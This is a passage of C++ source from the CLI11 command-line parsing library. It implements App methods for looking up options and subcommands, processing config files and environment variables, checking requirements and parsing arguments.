            std::begin(options_), std::end(options_), std::begin(options), [](const Option_p& val) { return val.get(); });

        if (filter) {
            options.erase(std::remove_if(std::begin(options),
                std::end(options),
                [&filter](const Option* opt) { return !filter(opt); }),
                std::end(options));
        }
        for (const auto& subcp : subcommands_) {
            // also check down into nameless subcommands
            const App* subc = subcp.get();
            if (subc->get_name().empty() && !subc->get_group().empty() && subc->get_group().front() == '+') {
                std::vector<const Option*> subcopts = subc->get_options(filter);
                options.insert(options.end(), subcopts.begin(), subcopts.end());
            }
        }
        return options;
    }

    CLI11_INLINE std::vector<Option*> App::get_options(const std::function<bool(Option*)> filter) {
        std::vector<Option*> options(options_.size());
        std::transform(
            std::begin(options_), std::end(options_), std::begin(options), [](const Option_p& val) { return val.get(); });

        if (filter) {
            options.erase(
                std::remove_if(std::begin(options), std::end(options), [&filter](Option* opt) { return !filter(opt); }),
                std::end(options));
        }
        for (auto& subc : subcommands_) {
            // also check down into nameless subcommands
            if (subc->get_name().empty() && !subc->get_group().empty() && subc->get_group().front() == '+') {
                auto subcopts = subc->get_options(filter);
                options.insert(options.end(), subcopts.begin(), subcopts.end());
            }
        }
        return options;
    }

    CLI11_NODISCARD CLI11_INLINE Option* App::get_option_no_throw(std::string option_name) noexcept {
        for (Option_p& opt : options_) {
            if (opt->check_name(option_name)) {
                return opt.get();
            }
        }
        for (auto& subc : subcommands_) {
            // also check down into nameless subcommands
            if (subc->get_name().empty()) {
                auto* opt = subc->get_option_no_throw(option_name);
                if (opt != nullptr) {
                    return opt;
                }
            }
        }
        return nullptr;
    }

    CLI11_NODISCARD CLI11_INLINE const Option* App::get_option_no_throw(std::string option_name) const noexcept {
        for (const Option_p& opt : options_) {
            if (opt->check_name(option_name)) {
                return opt.get();
            }
        }
        for (const auto& subc : subcommands_) {
            // also check down into nameless subcommands
            if (subc->get_name().empty()) {
                auto* opt = subc->get_option_no_throw(option_name);
                if (opt != nullptr) {
                    return opt;
                }
            }
        }
        return nullptr;
    }

    CLI11_NODISCARD CLI11_INLINE std::string App::get_display_name(bool with_aliases) const {
        if (name_.empty()) {
            return std::string("[Option Group: ") + get_group() + "]";
        }
        if (aliases_.empty() || !with_aliases) {
            return name_;
        }
        std::string dispname = name_;
        for (const auto& lalias : aliases_) {
            dispname.push_back(',');
            dispname.push_back(' ');
            dispname.append(lalias);
        }
        return dispname;
    }

    CLI11_NODISCARD CLI11_INLINE bool App::check_name(std::string name_to_check) const {
        std::string local_name = name_;
        if (ignore_underscore_) {
            local_name = detail::remove_underscore(name_);
            name_to_check = detail::remove_underscore(name_to_check);
        }
        if (ignore_case_) {
            local_name = detail::to_lower(name_);
            name_to_check = detail::to_lower(name_to_check);
        }

        if (local_name == name_to_check) {
            return true;
        }
        for (std::string les : aliases_) {  // NOLINT(performance-for-range-copy)
            if (ignore_underscore_) {
                les = detail::remove_underscore(les);
            }
            if (ignore_case_) {
                les = detail::to_lower(les);
            }
            if (les == name_to_check) {
                return true;
            }
        }
        return false;
    }

    CLI11_NODISCARD CLI11_INLINE std::vector<std::string> App::get_groups() const {
        std::vector<std::string> groups;

        for (const Option_p& opt : options_) {
            // Add group if it is not already in there
            if (std::find(groups.begin(), groups.end(), opt->get_group()) == groups.end()) {
                groups.push_back(opt->get_group());
            }
        }

        return groups;
    }

    CLI11_NODISCARD CLI11_INLINE std::vector<std::string> App::remaining(bool recurse) const {
        std::vector<std::string> miss_list;
        for (const std::pair<detail::Classifier, std::string>& miss : missing_) {
            miss_list.push_back(std::get<1>(miss));
        }
        // Get from a subcommand that may allow extras
        if (recurse) {
            if (!allow_extras_) {
                for (const auto& sub : subcommands_) {
                    if (sub->name_.empty() && !sub->missing_.empty()) {
                        for (const std::pair<detail::Classifier, std::string>& miss : sub->missing_) {
                            miss_list.push_back(std::get<1>(miss));
                        }
                    }
                }
            }
            // Recurse into subcommands

            for (const App* sub : parsed_subcommands_) {
                std::vector<std::string> output = sub->remaining(recurse);
                std::copy(std::begin(output), std::end(output), std::back_inserter(miss_list));
            }
        }
        return miss_list;
    }

    CLI11_NODISCARD CLI11_INLINE std::vector<std::string> App::remaining_for_passthrough(bool recurse) const {
        std::vector<std::string> miss_list = remaining(recurse);
        std::reverse(std::begin(miss_list), std::end(miss_list));
        return miss_list;
    }

    CLI11_NODISCARD CLI11_INLINE std::size_t App::remaining_size(bool recurse) const {
        auto remaining_options = static_cast<std::size_t>(std::count_if(
            std::begin(missing_), std::end(missing_), [](const std::pair<detail::Classifier, std::string>& val) {
                return val.first != detail::Classifier::POSITIONAL_MARK;
            }));

        if (recurse) {
            for (const App_p& sub : subcommands_) {
                remaining_options += sub->remaining_size(recurse);
            }
        }
        return remaining_options;
    }

    CLI11_INLINE void App::_validate() const {
        // count the number of positional only args
        auto pcount = std::count_if(std::begin(options_), std::end(options_), [](const Option_p& opt) {
            return opt->get_items_expected_max() >= detail::expected_max_vector_size && !opt->nonpositional();
            });
        if (pcount > 1) {
            auto pcount_req = std::count_if(std::begin(options_), std::end(options_), [](const Option_p& opt) {
                return opt->get_items_expected_max() >= detail::expected_max_vector_size && !opt->nonpositional() &&
                    opt->get_required();
                });
            if (pcount - pcount_req > 1) {
                throw InvalidError(name_);
            }
        }

        std::size_t nameless_subs{ 0 };
        for (const App_p& app : subcommands_) {
            app->_validate();
            if (app->get_name().empty())
                ++nameless_subs;
        }

        if (require_option_min_ > 0) {
            if (require_option_max_ > 0) {
                if (require_option_max_ < require_option_min_) {
                    throw(InvalidError("Required min options greater than required max options", ExitCodes::InvalidError));
                }
            }
            if (require_option_min_ > (options_.size() + nameless_subs)) {
                throw(
                    InvalidError("Required min options greater than number of available options", ExitCodes::InvalidError));
            }
        }
    }

    CLI11_INLINE void App::_configure() {
        if (default_startup == startup_mode::enabled) {
            disabled_ = false;
        }
        else if (default_startup == startup_mode::disabled) {
            disabled_ = true;
        }
        for (const App_p& app : subcommands_) {
            if (app->has_automatic_name_) {
                app->name_.clear();
            }
            if (app->name_.empty()) {
                app->fallthrough_ = false;  // make sure fallthrough_ is false to prevent infinite loop
                app->prefix_command_ = false;
            }
            // make sure the parent is set to be this object in preparation for parse
            app->parent_ = this;
            app->_configure();
        }
    }

    CLI11_INLINE void App::run_callback(bool final_mode, bool suppress_final_callback) {
        pre_callback();
        // in the main app if immediate_callback_ is set it runs the main callback before the used subcommands
        if (!final_mode && parse_complete_callback_) {
            parse_complete_callback_();
        }
        // run the callbacks for the received subcommands
        for (App* subc : get_subcommands()) {
            if (subc->parent_ == this) {
                subc->run_callback(true, suppress_final_callback);
            }
        }
        // now run callbacks for option_groups
        for (auto& subc : subcommands_) {
            if (subc->name_.empty() && subc->count_all() > 0) {
                subc->run_callback(true, suppress_final_callback);
            }
        }

        // finally run the main callback
        if (final_callback_ && (parsed_ > 0) && (!suppress_final_callback)) {
            if (!name_.empty() || count_all() > 0 || parent_ == nullptr) {
                final_callback_();
            }
        }
    }

    CLI11_NODISCARD CLI11_INLINE bool App::_valid_subcommand(const std::string& current, bool ignore_used) const {
        // Don't match if max has been reached - but still check parents
        if (require_subcommand_max_ != 0 && parsed_subcommands_.size() >= require_subcommand_max_ &&
            subcommand_fallthrough_) {
            return parent_ != nullptr && parent_->_valid_subcommand(current, ignore_used);
        }
        auto* com = _find_subcommand(current, true, ignore_used);
        if (com != nullptr) {
            return true;
        }
        // Check parent if exists, else return false
        if (subcommand_fallthrough_) {
            return parent_ != nullptr && parent_->_valid_subcommand(current, ignore_used);
        }
        return false;
    }

    CLI11_NODISCARD CLI11_INLINE detail::Classifier App::_recognize(const std::string& current,
        bool ignore_used_subcommands) const {
        std::string dummy1, dummy2;

        if (current == "--")
            return detail::Classifier::POSITIONAL_MARK;
        if (_valid_subcommand(current, ignore_used_subcommands))
            return detail::Classifier::SUBCOMMAND;
        if (detail::split_long(current, dummy1, dummy2))
            return detail::Classifier::LONG;
        if (detail::split_short(current, dummy1, dummy2)) {
            if (dummy1[0] >= '0' && dummy1[0] <= '9') {
                if (get_option_no_throw(std::string{ '-', dummy1[0] }) == nullptr) {
                    return detail::Classifier::NONE;
                }
            }
            return detail::Classifier::SHORT;
        }
        if ((allow_windows_style_options_) && (detail::split_windows_style(current, dummy1, dummy2)))
            return detail::Classifier::WINDOWS_STYLE;
        if ((current == "++") && !name_.empty() && parent_ != nullptr)
            return detail::Classifier::SUBCOMMAND_TERMINATOR;
        auto dotloc = current.find_first_of('.');
        if (dotloc != std::string::npos) {
            auto* cm = _find_subcommand(current.substr(0, dotloc), true, ignore_used_subcommands);
            if (cm != nullptr) {
                auto res = cm->_recognize(current.substr(dotloc + 1), ignore_used_subcommands);
                if (res == detail::Classifier::SUBCOMMAND) {
                    return res;
                }
            }
        }
        return detail::Classifier::NONE;
    }

    CLI11_INLINE bool App::_process_config_file(const std::string& config_file, bool throw_error) {
        auto path_result = detail::check_path(config_file.c_str());
        if (path_result == detail::path_type::file) {
            try {
                std::vector<ConfigItem> values = config_formatter_->from_file(config_file);
                _parse_config(values);
                return true;
            }
            catch (const FileError&) {
                if (throw_error) {
                    throw;
                }
                return false;
            }
        }
        else if (throw_error) {
            throw FileError::Missing(config_file);
        }
        else {
            return false;
        }
    }

    CLI11_INLINE void App::_process_config_file() {
        if (config_ptr_ != nullptr) {
            bool config_required = config_ptr_->get_required();
            auto file_given = config_ptr_->count() > 0;
            if (!(file_given || config_ptr_->envname_.empty())) {
                std::string ename_string = detail::get_environment_value(config_ptr_->envname_);
                if (!ename_string.empty()) {
                    config_ptr_->add_result(ename_string);
                }
            }
            config_ptr_->run_callback();

            auto config_files = config_ptr_->as<std::vector<std::string>>();
            bool files_used{ file_given };
            if (config_files.empty() || config_files.front().empty()) {
                if (config_required) {
                    throw FileError("config file is required but none was given");
                }
                return;
            }
            for (const auto& config_file : config_files) {
                if (_process_config_file(config_file, config_required || file_given)) {
                    files_used = true;
                }
            }
            if (!files_used) {
                // this is done so the count shows as 0 if no callbacks were processed
                config_ptr_->clear();
                bool force = config_ptr_->force_callback_;
                config_ptr_->force_callback_ = false;
                config_ptr_->run_callback();
                config_ptr_->force_callback_ = force;
            }
        }
    }

    CLI11_INLINE void App::_process_env() {
        for (const Option_p& opt : options_) {
            if (opt->count() == 0 && !opt->envname_.empty()) {
                std::string ename_string = detail::get_environment_value(opt->envname_);
                if (!ename_string.empty()) {
                    std::string result = ename_string;
                    result = opt->_validate(result, 0);
                    if (result.empty()) {
                        opt->add_result(ename_string);
                    }
                }
            }
        }

        for (App_p& sub : subcommands_) {
            if (sub->get_name().empty() || (sub->count_all() > 0 && !sub->parse_complete_callback_)) {
                // only process environment variables if the callback has actually been triggered already
                sub->_process_env();
            }
        }
    }

    CLI11_INLINE void App::_process_callbacks() {

        for (App_p& sub : subcommands_) {
            // process the priority option_groups first
            if (sub->get_name().empty() && sub->parse_complete_callback_) {
                if (sub->count_all() > 0) {
                    sub->_process_callbacks();
                    sub->run_callback();
                }
            }
        }

        for (const Option_p& opt : options_) {
            if ((*opt) && !opt->get_callback_run()) {
                opt->run_callback();
            }
        }
        for (App_p& sub : subcommands_) {
            if (!sub->parse_complete_callback_) {
                sub->_process_callbacks();
            }
        }
    }

    CLI11_INLINE void App::_process_help_flags(bool trigger_help, bool trigger_all_help) const {
        const Option* help_ptr = get_help_ptr();
        const Option* help_all_ptr = get_help_all_ptr();

        if (help_ptr != nullptr && help_ptr->count() > 0)
            trigger_help = true;
        if (help_all_ptr != nullptr && help_all_ptr->count() > 0)
            trigger_all_help = true;

        // If there were parsed subcommands, call those. First subcommand wins if there are multiple ones.
        if (!parsed_subcommands_.empty()) {
            for (const App* sub : parsed_subcommands_)
                sub->_process_help_flags(trigger_help, trigger_all_help);

            // Only the final subcommand should call for help. All help wins over help.
        }
        else if (trigger_all_help) {
            throw CallForAllHelp();
        }
        else if (trigger_help) {
            throw CallForHelp();
        }
    }

    CLI11_INLINE void App::_process_requirements() {
        // check excludes
        bool excluded{ false };
        std::string excluder;
        for (const auto& opt : exclude_options_) {
            if (opt->count() > 0) {
                excluded = true;
                excluder = opt->get_name();
            }
        }
        for (const auto& subc : exclude_subcommands_) {
            if (subc->count_all() > 0) {
                excluded = true;
                excluder = subc->get_display_name();
            }
        }
        if (excluded) {
            if (count_all() > 0) {
                throw ExcludesError(get_display_name(), excluder);
            }
            // if we are excluded but didn't receive anything, just return
            return;
        }

        // check excludes
        bool missing_needed{ false };
        std::string missing_need;
        for (const auto& opt : need_options_) {
            if (opt->count() == 0) {
                missing_needed = true;
                missing_need = opt->get_name();
            }
        }
        for (const auto& subc : need_subcommands_) {
            if (subc->count_all() == 0) {
                missing_needed = true;
                missing_need = subc->get_display_name();
            }
        }
        if (missing_needed) {
            if (count_all() > 0) {
                throw RequiresError(get_display_name(), missing_need);
            }
            // if we missing something but didn't have any options, just return
            return;
        }

        std::size_t used_options = 0;
        for (const Option_p& opt : options_) {

            if (opt->count() != 0) {
                ++used_options;
            }
            // Required but empty
            if (opt->get_required() && opt->count() == 0) {
                throw RequiredError(opt->get_name());
            }
            // Requires
            for (const Option* opt_req : opt->needs_)
                if (opt->count() > 0 && opt_req->count() == 0)
                    throw RequiresError(opt->get_name(), opt_req->get_name());
            // Excludes
            for (const Option* opt_ex : opt->excludes_)
                if (opt->count() > 0 && opt_ex->count() != 0)
                    throw ExcludesError(opt->get_name(), opt_ex->get_name());
        }
        // check for the required number of subcommands
        if (require_subcommand_min_ > 0) {
            auto selected_subcommands = get_subcommands();
            if (require_subcommand_min_ > selected_subcommands.size())
                throw RequiredError::Subcommand(require_subcommand_min_);
        }

        // Max error cannot occur, the extra subcommand will parse as an ExtrasError or a remaining item.

        // run this loop to check how many unnamed subcommands were actually used since they are considered options
        // from the perspective of an App
        for (App_p& sub : subcommands_) {
            if (sub->disabled_)
                continue;
            if (sub->name_.empty() && sub->count_all() > 0) {
                ++used_options;
            }
        }

        if (require_option_min_ > used_options || (require_option_max_ > 0 && require_option_max_ < used_options)) {
            auto option_list = detail::join(options_, [this](const Option_p& ptr) {
                if (ptr.get() == help_ptr_ || ptr.get() == help_all_ptr_) {
                    return std::string{};
                }
                return ptr->get_name(false, true);
                });

            auto subc_list = get_subcommands([](App* app) { return ((app->get_name().empty()) && (!app->disabled_)); });
            if (!subc_list.empty()) {
                option_list += "," + detail::join(subc_list, [](const App* app) { return app->get_display_name(); });
            }
            throw RequiredError::Option(require_option_min_, require_option_max_, used_options, option_list);
        }

        // now process the requirements for subcommands if needed
        for (App_p& sub : subcommands_) {
            if (sub->disabled_)
                continue;
            if (sub->name_.empty() && sub->required_ == false) {
                if (sub->count_all() == 0) {
                    if (require_option_min_ > 0 && require_option_min_ <= used_options) {
                        continue;
                        // if we have met the requirement and there is nothing in this option group skip checking
                        // requirements
                    }
                    if (require_option_max_ > 0 && used_options >= require_option_min_) {
                        continue;
                        // if we have met the requirement and there is nothing in this option group skip checking
                        // requirements
                    }
                }
            }
            if (sub->count() > 0 || sub->name_.empty()) {
                sub->_process_requirements();
            }

            if (sub->required_ && sub->count_all() == 0) {
                throw(CLI::RequiredError(sub->get_display_name()));
            }
        }
    }

    CLI11_INLINE void App::_process() {
        // help takes precedence over other potential errors and config and environment shouldn't be processed if help
        // throws
        _process_help_flags();
        try {
            // the config file might generate a FileError but that should not be processed until later in the process
            // to allow for help, version and other errors to generate first.
            _process_config_file();

            // process env shouldn't throw but no reason to process it if config generated an error
            _process_env();
        }
        catch (const CLI::FileError&) {
            // callbacks can generate exceptions which should take priority
            // over the config file error if one exists.
            _process_callbacks();
            throw;
        }

        _process_callbacks();

        _process_requirements();
    }

    CLI11_INLINE void App::_process_extras() {
        if (!(allow_extras_ || prefix_command_)) {
            std::size_t num_left_over = remaining_size();
            if (num_left_over > 0) {
                throw ExtrasError(name_, remaining(false));
            }
        }

        for (App_p& sub : subcommands_) {
            if (sub->count() > 0)
                sub->_process_extras();
        }
    }

    CLI11_INLINE void App::_process_extras(std::vector<std::string>& args) {
        if (!(allow_extras_ || prefix_command_)) {
            std::size_t num_left_over = remaining_size();
            if (num_left_over > 0) {
                args = remaining(false);
                throw ExtrasError(name_, args);
            }
        }

        for (App_p& sub : subcommands_) {
            if (sub->count() > 0)
                sub->_process_extras(args);
        }
    }

    CLI11_INLINE void App::increment_parsed() {
        ++parsed_;
        for (App_p& sub : subcommands_) {
            if (sub->get_name().empty())
                sub->increment_parsed();
        }
    }

    CLI11_INLINE void App::_parse(std::vector<std::string>& args) {
        increment_parsed();
        _trigger_pre_parse(args.size());
        bool positional_only = false;

        while (!args.empty()) {
            if (!_parse_single(args, positional_only)) {
                break;
            }
        }

        if (parent_ == nullptr) {
            _process();

            // Throw error if any items are left over (depending on settings)
            _process_extras(args);

            // Convert missing (pairs) to extras (string only) ready for processing in another app
            args = remaining_for_passthrough(false);
        }
        else if (parse_complete_callback_) {
            _process_env();
            _process_callbacks();
            _process_help_flags();
            _process_requirements();
            run_callback(false, true);
        }
    }

    CLI11_INLINE void App::_parse(std::vector<std::string>&& args) {
        // this can only be called by the top level in which case parent == nullptr by definition
        // operation is simplified
        increment_parsed();
        _trigger_pre_parse(args.size());
        bool positional_only = false;

        while (!args.empty()) {
            _parse_single(args, positional_only);
        }
        _process();

        // Throw error if any items are left over (depending on settings)
        _process_extras();
    }

    CLI11_INLINE void App::_parse_stream(std::istream& input) {
        auto values = config_formatter_->from_config(input);
        _parse_config(values);
        increment_parsed();
        _trigger_pre_parse(values.size());
        _process();

        // Throw error if any items are left over (depending on settings)
        _process_extras();
    }

    CLI11_INLINE void App::_parse_config(const std::vector<ConfigItem>& args) {
        for (const ConfigItem& item : args) {
            if (!_parse_single_config(item) && allow_config_extras_ == config_extras_mode::error)
                throw ConfigError::Extras(item.fullname());
        }
    }

    CLI11_INLINE bool App::_parse_single_config(const ConfigItem& item, std::size_t level) {

        if (level < item.parents.size()) {
            auto* subcom = get_subcommand_no_throw(item.parents.at(level));
            return (subcom != nullptr) ? subcom->_parse_single_config(item, level + 1) : false;
        }
        // check for section open
        if (item.name == "++") {
            if (configurable_) {
                increment_parsed();
                _trigger_pre_parse(2);
                if (parent_ != nullptr) {
                    parent_->parsed_subcommands_.push_back(this);
                }
            }
            return true;
        }
        // check for section close
        if (item.name == "--") {
            if (configurable_ && parse_complete_callback_) {
                _process_callbacks();
                _process_requirements();
                run_callback();
            }
            return true;
        }
        Option* op = get_option_no_throw("--" + item.name);
        if (op == nullptr) {
            if (item.name.size() == 1) {
                op = get_option_no_throw("-" + item.name);
            }
            if (op == nullptr) {
                op = get_option_no_throw(item.name);
            }
            else if (!op->get_configurable()) {
                auto* testop = get_option_no_throw(item.name);
                if (testop != nullptr && testop->get_configurable()) {
                    op = testop;
                }
            }
        }
        else if (!op->get_configurable()) {
            if (item.name.size() == 1) {
                auto* testop = get_option_no_throw("-" + item.name);
                if (testop != nullptr && testop->get_configurable()) {
                    op = testop;
                }
            }
            if (!op->get_configurable()) {
                auto* testop = get_option_no_throw(item.name);
                if (testop != nullptr && testop->get_configurable()) {
                    op = testop;
                }
            }
        }

        if (op == nullptr) {
            // If the option was not present
            if (get_allow_config_extras() == config_extras_mode::capture) {
                // Should we worry about classifying the extras properly?
                missing_.emplace_back(detail::Classifier::NONE, item.fullname());
                for (const auto& input : item.inputs) {
                    missing_.emplace_back(detail::Classifier::NONE, input);
                }
            }
            return false;
        }

        if (!op->get_configurable()) {
            if (get_allow_config_extras() == config_extras_mode::ignore_all) {
                return false;
            }
            throw ConfigError::NotConfigurable(item.fullname());
        }
        if (op->empty()) {
            std::vector<std::string> buffer;  // a buffer to use for copying an modifying inputs in a few cases
            bool useBuffer{ false };
            if (item.multiline) {
                if (!op->get_inject_separator()) {
                    buffer = item.inputs;
                    buffer.erase(std::remove(buffer.begin(), buffer.end(), "%%"), buffer.end());
                    useBuffer = true;
                }
            }
            const std::vector<std::string>& inputs = (useBuffer) ? buffer : item.inputs;
            if (op->get_expected_min() == 0) {
                if (item.inputs.size() <= 1) {
                    // Flag parsing
                    auto res = config_formatter_->to_flag(item);
                    bool converted{ false };
                    if (op->get_disable_flag_override()) {
                        auto val = detail::to_flag_value(res);
                        if (val == 1) {
                            res = op->get_flag_value(item.name, "{}");
                            converted = true;
                        }
                    }

                    if (!converted) {
                        errno = 0;
                        if (res != "{}" || op->get_expected_max() <= 1) {
                            res = op->get_flag_value(item.name, res);
                        }
                    }

                    op->add_result(res);
                    return true;
                }
                if (static_cast<int>(inputs.size()) > op->get_items_expected_max() &&
                    op->get_multi_option_policy() != MultiOptionPolicy::TakeAll) {
                    if (op->get_items_expected_max() > 1) {
                        throw ArgumentMismatch::AtMost(item.fullname(), op->get_items_expected_max(), inputs.size());
                    }

                    if (!op->get_disable_flag_override()) {
                        throw ConversionError::TooManyInputsFlag(item.fullname());
                    }
                    // if the disable flag override is set then we must have the flag values match a known flag value
                    // this is true regardless of the output value, so an array input is possible and must be accounted for
                    for (const auto& res : inputs) {
                        bool valid_value{ false };
                        if (op->default_flag_values_.empty()) {
                            if (res == "true" || res == "false" || res == "1" || res == "0") {
                                valid_value = true;
                            }
                        }
                        else {
                            for (const auto& valid_res : op->default_flag_values_) {
                                if (valid_res.second == res) {
                                    valid_value = true;
                                    break;
                                }
                            }
                        }

                        if (valid_value) {
                            op->add_result(res);
                        }
                        else {
                            throw InvalidError("invalid flag argument given");
                        }
                    }
                    return true;
                }
            }
            op->add_result(inputs);
            op->run_callback();
        }

        return true;
    }

    CLI11_INLINE bool App::_parse_single(std::vector<std::string>& args, bool& positional_only) {
        bool retval = true;
        detail::Classifier classifier = positional_only ? detail::Classifier::NONE : _recognize(args.back());
        switch (classifier) {
        case detail::Classifier::POSITIONAL_MARK:
            args.pop_back();
            positional_only = true;
            if ((!_has_remaining_positionals()) && (parent_ != nullptr)) {
                retval = false;
            }
            else {
                _move_to_missing(classifier, "--");
            }
            break;
        case detail::Classifier::SUBCOMMAND_TERMINATOR:
            // treat this like a positional mark if in the parent app
            args.pop_back();
            retval = false;
            break;
        case detail::Classifier::SUBCOMMAND:
            retval = _parse_subcommand(args);
            break;
        case detail::Classifier::LONG:
        case detail::Classifier::SHORT:
        case detail::Classifier::WINDOWS_STYLE:
            // If already parsed a subcommand, don't accept options_
            retval = _parse_arg(args, classifier, false);
            break;
        case detail::Classifier::NONE:
            // Probably a positional or something for a parent (sub)command
            retval = _parse_positional(args, false);
            if (retval && positionals_at_end_) {
                positional_only = true;
            }
            break;
            // LCOV_EXCL_START
        default:
            throw HorribleError("unrecognized classifier (you should not see this!)");
            // LCOV_EXCL_STOP
        }
        return retval;
    }

    CLI11_NODISCARD CLI11_INLINE std::size_t App::_count_remaining_positionals(bool required_only) const {
        std::size_t retval = 0;
        for (const Option_p& opt : options_) {
            if (opt->get_positional() && (!required_only || opt->get_required())) {
                if (opt->get_items_expected_min() > 0 && static_cast<int>(opt->count()) < opt->get_items_expected_min()) {
                    retval += static_cast<std::size_t>(opt->get_items_expected_min()) - opt->count();
                }
            }
        }
        return retval;
    }

    CLI11_NODISCARD CLI11_INLINE bool App::_has_remaining_positionals() const {
        for (const Option_p& opt : options_) {
            if (opt->get_positional() && ((static_cast<int>(opt->count()) < opt->get_items_expected_min()))) {
                return true;
            }
        }

        return false;
    }

    CLI11_INLINE bool App::_parse_positional(std::vector<std::string>& args, bool haltOnSubcommand) {

        const std::string& positional = args.back();
        Option* posOpt{ nullptr };

        if (positionals_at_end_) {
            // deal with the case of required arguments at the end which should take precedence over other arguments
            auto arg_rem = args.size();
            auto remreq = _count_remaining_positionals(true);
            if (arg_rem <= remreq) {
                for (const Option_p& opt : options_) {
                    if (opt->get_positional() && opt->required_) {
                        if (static_cast<int>(opt->count()) < opt->get_items_expected_min()) {
                            if (validate_positionals_) {
                                std::string pos = positional;
                                pos = opt->_validate(pos, 0);
                                if (!pos.empty()) {
                                    continue;
                                }
                            }
                            posOpt = opt.get();
                            break;
                        }
                    }
                }
            }
        }
        if (posOpt == nullptr) {
            for (const Option_p& opt : options_) {
                // Eat options, one by one, until done
                if (opt->get_positional() &&
                    (static_cast<int>(opt->count()) < opt->get_items_expected_max() || opt->get_allow_extra_args())) {
                    if (validate_positionals_) {
                        std::string pos = positional;
                        pos = opt->_validate(pos, 0);
                        if (!pos.empty()) {
                            continue;
                        }
                    }
                    posOpt = opt.get();
                    break;
                }
            }
        }
        if (posOpt != nullptr) {
            parse_order_.push_back(posOpt);
            if (posOpt->get_inject_separator()) {
                if (!posOpt->results().empty() && !posOpt->results().back().empty()) {
                    posOpt->add_result(std::string{});
                }
            }
            if (posOpt->get_trigger_on_parse() && posOpt->current_option_state_ == Option::option_state::callback_run) {
                posOpt->clear();
            }
            posOpt->add_result(positional);
            if (posOpt->get_trigger_on_parse()) {
                posOpt->run_callback();
            }

            args.pop_back();
            return true;
        }

        for (auto& subc : subcommands_) {
            if ((subc->name_.empty()) && (!subc->disabled_)) {
                if (subc->_parse_positional(args, false)) {
                    if (!subc->pre_parse_called_) {
                        subc->_trigger_pre_parse(args.size());
                    }
                    return true;
                }
            }
        }
        // let the parent deal with it if possible
        if (parent_ != nullptr && fallthrough_) {
            return _get_fallthrough_parent()->_parse_positional(args, static_cast<bool>(parse_complete_callback_));
        }
        /// Try to find a local subcommand that is repeated
        auto* com = _find_subcommand(args.back(), true, false);
        if (com != nullptr && (require_subcommand_max_ == 0 || require_subcommand_max_ > parsed_subcommands_.size())) {
            if (haltOnSubcommand) {
                return false;
            }
            args.pop_back();
            com->_parse(args);
            return true;
        }
        if (subcommand_fallthrough_) {
            /// now try one last gasp at subcommands that have been executed before, go to root app and try to find a
            /// subcommand in a broader way, if one exists let the parent deal with it
            auto* parent_app = (parent_ != nullptr) ? _get_fallthrough_parent() : this;
            com = parent_app->_find_subcommand(args.back(), true, false);
            if (com != nullptr && (com->parent_->require_subcommand_max_ == 0 ||
                com->parent_->require_subcommand_max_ > com->parent_->parsed_subcommands_.size())) {
                return false;
            }
        }
        if (positionals_at_end_) {
            throw CLI::ExtrasError(name_, args);
        }
        /// If this is an option group don't deal with it
        if (parent_ != nullptr && name_.empty()) {
            return false;
        }
        /// We are out of other options this goes to missing
        _move_to_missing(detail::Classifier::NONE, positional);
        args.pop_back();
        if (prefix_command_) {
            while (!args.empty()) {
                _move_to_missing(detail::Classifier::NONE, args.back());
                args.pop_back();
            }
        }

        return true;
    }

    CLI11_NODISCARD CLI11_INLINE App*
        App::_find_subcommand(const std::string& subc_name, bool ignore_disabled, bool ignore_used) const noexcept {
        for (const App_p& com : subcommands_) {
            if (com->disabled_ && ignore_disabled)
                continue;
            if (com->get_name().empty()) {
                auto* subc = com->_find_subcommand(subc_name, ignore_disabled, ignore_used);
                if (subc != nullptr) {
                    return subc;
                }
            }
            if (com->check_name(subc_name)) {
                if ((!*com) || !ignore_used)
                    return com.get();
            }
        }
        return nullptr;
    }

    CLI11_INLINE bool App::_parse_subcommand(std::vector<std::string>& args) {
        if (_count_remaining_positionals(/* required */ true) > 0) {
            _parse_positional(args, false);
            return true;
        }
        auto* com = _find_subcommand(args.back(), true, true);
        if (com == nullptr) {
            // the main way to get here is using .notation
            auto dotloc = args.back().find_first_of('.');
            if (dotloc != std::string::npos) {
                com = _find_subcommand(args.back().substr(0, dotloc), true, true);
                if (com != nullptr) {
                    args.back() = args.back().substr(dotloc + 1);
                    args.push_back(com->get_display_name());
                }
            }
        }
        if (com != nullptr) {
            args.pop_back();
            if (!com->silent_) {
                parsed_subcommands_.push_back(com);
            }
            com->_parse(args);
            auto* parent_app = com->parent_;
            while (parent_app != this) {
                parent_app->_trigger_pre_parse(args.size());
                if (!com->silent_) {
                    parent_app->parsed_subcommands_.push_back(com);
                }
                parent_app = parent_app->parent_;
            }
            return true;
        }

        if (parent_ == nullptr)
            throw HorribleError("Subcommand " + args.back() + " missing");
        return false;
    }

    CLI11_INLINE bool
        App::_parse_arg(std::vector<std::string>& args, detail::Classifier current_type, bool local_processing_only) {

        std::string current = args.back();

        std::string arg_name;
        std::string value;
        std::string rest;

        switch (current_type) {
        case detail::Classifier::LONG:
            if (!detail::split_long(current, arg_name, value))
                throw HorribleError("Long parsed but missing (you should not see this):" + args.back());
            break;
        case detail::Classifier::SHORT:
            if (!detail::split_short(current, arg_name, rest))
                throw HorribleError("Short parsed but missing! You should not see this");
            break;
        case detail::Classifier::WINDOWS_STYLE:
            if (!detail::split_windows_style(current, arg_name, value))
                throw HorribleError("windows option parsed but missing! You should not see this");
            break;
        case detail::Classifier::SUBCOMMAND:
        case detail::Classifier::SUBCOMMAND_TERMINATOR:
        case detail::Classifier::POSITIONAL_MARK:
        case detail::Classifier::NONE:
        default:
            throw HorribleError("parsing got called with invalid option! You should not see this");
        }

        auto op_ptr = std::find_if(std::begin(options_), std::end(options_), [arg_name, current_type](const Option_p& opt) {
            if (current_type == detail::Classifier::LONG)
                return opt->check_lname(arg_name);
            if (current_type == detail::Classifier::SHORT)
                return opt->check_sname(arg_name);
            // this will only get called for detail::Classifier::WINDOWS_STYLE
            return opt->check_lname(arg_name) || opt->check_sname(arg_name);
            });

        // Option not found
        while (op_ptr == std::end(options_)) {
            // using while so we can break
            for (auto& subc : subcommands_) {
                if (subc->name_.empty() && !subc->disabled_) {
                    if (subc->_parse_arg(args, current_type, local_processing_only)) {
                        if (!subc->pre_parse_called_) {
                            subc->_trigger_pre_parse(args.size());
                        }
                        return true;
                    }
                }
            }
            if (allow_non_standard_options_ && current_type == detail::Classifier::SHORT && current.size() > 2) {
                std::string narg_name;
                std::string nvalue;
                detail::split_long(std::string{ '-' } + current, narg_name, nvalue);
                op_ptr = std::find_if(std::begin(options_), std::end(options_), [narg_name](const Option_p& opt) {
                    return opt->check_sname(narg_name);
                    });
                if (op_ptr != std::end(options_)) {
